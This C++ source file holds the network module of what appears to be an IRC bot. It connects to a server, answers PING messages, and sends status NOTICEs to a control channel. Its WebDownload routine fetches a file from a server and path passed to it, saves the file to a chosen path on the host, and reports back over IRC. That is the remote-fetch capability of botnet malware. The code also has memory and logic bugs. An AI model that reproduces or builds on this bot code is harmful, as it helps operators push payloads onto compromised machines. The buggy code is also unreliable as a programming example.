#include "Network.h"

void Net::SetAddrStructure(SOCKET sock, sockaddr_in addr, int port, char *ip)
{
	BotSocket  = sock;
	BotAddress = addr;
 
	host = gethostbyname(ip);

	BotAddress.sin_family = AF_INET;
	BotAddress.sin_port = htons(port);
	BotAddress.sin_addr.s_addr = *(unsigned long*) host->h_addr; //inet_addr(ip);
}

int Net::Connect()
{
	int ret;
	if(connect(BotSocket, (struct sockaddr*)&BotAddress, sizeof(BotAddress)) == -1)
	{
		printf("ERROR [ connect(): %d\n", WSAGetLastError());
		ret = -1;
	}
	else
	{
		printf("Initialization of connect( OK )\n");
		ret = 0;
	}

	return ret;
}

void Net::Send(char *text, SOCKET sock)
{
	STextLen = strlen(text);
	SText    = new char[STextLen];

	memset(SText, '\0', STextLen);
	memcpy(SText, text, STextLen);

	if(send(sock, SText, STextLen, 0) == -1)
	{
		printf("ERROR on send: %d\n", WSAGetLastError());
		exit(1);
	}

	delete SText;
}

char *Net::Recv(SOCKET sock)
{
	char ping[100];
	RText = new char[1024];
	memset(RText, '\0', 1024);
	int test = 0;

	test = recv(sock, RText, 1024, 0);

	if(strstr(RText, "PING"))
	{
		for(int n=0; n<1024, RText[n]!=0; n++)
		{
			if(RText[n]=='P' && RText[n+1]=='I' && RText[n+2]=='N' && RText[n+3]=='G' && RText[n+4]==' ' && RText[n+5]==':')
			{
				for(int y=0; y<6; n++, y++)
				{
					ping[y]=RText[n];
				}
				for(y=6; RText[n]!=' ' && RText[n]!='\n'; n++, y++)
				{
					ping[y]=RText[n];
				}
				ping[y]=0;
				break;
			}
		}

		char *a1, *a2;
		std::string p;
		a1 = ping; a2 = ping;

		while(*a2 && !strchr(" :", *a2))
			++a2;
		p.assign(a1, a2 - a1);
		if(*a2 != ':')
			a1 = ++a2;
		    a1 = ++a2;

	    char *PiNG = new char[100];
		memset(PiNG, '\0', 100);
		sprintf(PiNG, "PONG :%s\n", a2);
		Send(PiNG, sock);
	}

	return (test == 0 || test == -1) ? ("666") : RText;
}

void Net::QuitConnection()
{
	WSACleanup();
	closesocket(BotSocket);
}

char *Net::GetLocalIp()
{
	WSADATA wsaData;
	WSAStartup(0x202, &wsaData);

	char name[255];
	char *ip = new char[20];

	PHOSTENT host;

	gethostname(name, sizeof(name));
	host = gethostbyname(name);
	ip = inet_ntoa(*(struct in_addr*)*host->h_addr_list);

	return ip;
}

int Net::WebDownload(char *server, int port, char *down_file, char *file_position, SOCKET sock)
{
	int ret;
	// Create a WinInet session
    HINTERNET hSession = ::InternetOpen("HTTPGET", INTERNET_OPEN_TYPE_PRECONFIG, 0, 0, 0);
	
    // Create an HTTP connection to the server (technically the connection is
    // established only when the first request is made).
	
    HINTERNET hConnection = ::InternetConnect(hSession, server,port, NULL,NULL,INTERNET_SERVICE_HTTP,0, 0);
	if(hConnection == 0)
	{
		ret = 666;
	}
	else
	{
		// Prepare a request for the web page.
		HINTERNET hRequest = ::HttpOpenRequest(hConnection, 0, down_file, 0, 0, 0, 0, 0);
		if(hRequest == 0)
		{
			ret = 666;
		}
		else
		{
			// Send the HTTP request.
			ret = ::HttpSendRequest(hRequest, 0, 0, 0, 0);
			if(ret == 0)
			{
				ret = 666;
			}
			else
			{
				HANDLE f;
				// Read the response data.
				DWORD dwNumberOfBytesAvailable = 0;
				// dobimo stevilo bytov
				::InternetQueryDataAvailable(hRequest, &dwNumberOfBytesAvailable, 0, 0);
				
				if(dwNumberOfBytesAvailable < 312)
				{
					char *info = new char[150];
					memset(info, '\0', 150);
					sprintf(info, "NOTICE %s :Downloading error! Bytes under 312b\n", CHANNEL);
					Send(info, sock);
					delete info;
				}
				else
				{
					char *info = new char[312];
					memset(info, '\0', 312);
					sprintf(info, "NOTICE %s :File downloaded to: %s\n", CHANNEL, file_position);
					Send(info, sock);
					delete info;

					f = CreateFile(file_position, GENERIC_WRITE, 0, NULL, CREATE_ALWAYS, 0, 0);
					
					do
					{
						if (dwNumberOfBytesAvailable > 0)
						{
							char* pBuffer = new char[dwNumberOfBytesAvailable + 1];
							pBuffer[dwNumberOfBytesAvailable] = 0;
							
							DWORD dwBytesRead = 0;
							
							::InternetReadFile(hRequest,
								pBuffer,
								dwNumberOfBytesAvailable,
								&dwBytesRead);
							
							WriteFile(f, pBuffer, dwBytesRead, &dwNumberOfBytesAvailable, NULL);
							
							delete [] pBuffer;
						}
					}
					while (dwNumberOfBytesAvailable > 0);
				}
				
				::CloseHandle(f);
				// Close the request handle.
				::InternetCloseHandle(hRequest);
				// Close the HTTP connection handle.
				::InternetCloseHandle(hConnection);
				// Close the WinInet session.
				::InternetCloseHandle(hSession);
			}
		}
	}

	return ret;
}